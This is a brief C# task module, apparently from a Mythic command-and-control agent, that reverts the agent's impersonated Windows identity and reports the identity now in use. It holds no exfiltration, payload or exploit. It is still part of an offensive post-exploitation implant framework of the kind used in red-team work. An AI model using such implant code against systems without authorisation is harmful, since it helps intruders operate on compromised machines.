#define COMMAND_NAME_UPPER

#if DEBUG
#define REV2SELF
#endif

#if REV2SELF


using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;

namespace Tasks
{
    public class rev2self : Tasking
    {
        public rev2self(IAgent agent, MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            _agent.GetIdentityManager().Revert();
            var current = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
            _agent.GetTaskManager().AddTaskResponseToQueue(
                CreateTaskResponse(
                    $"Reverted identity to {current.Name}", true));
        }

    }
}
#endif